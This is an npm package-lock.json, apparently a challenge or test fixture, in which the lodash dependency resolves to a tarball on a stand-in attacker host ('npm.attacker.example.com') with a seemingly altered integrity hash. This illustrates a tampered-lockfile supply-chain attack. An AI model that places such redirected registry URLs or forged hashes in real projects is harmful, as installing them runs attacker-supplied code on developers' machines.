{
  "name": "challenge-arena",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://npm.attacker.example.com/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDE0/KswPEGGnOHCHMOy4POp8eruI7/F1z5pA+Y7Gq3D0M3jXwWksIBgEMv0tzGrpOFalGFMYM/ifiPGQgw=="
    }
  }
}
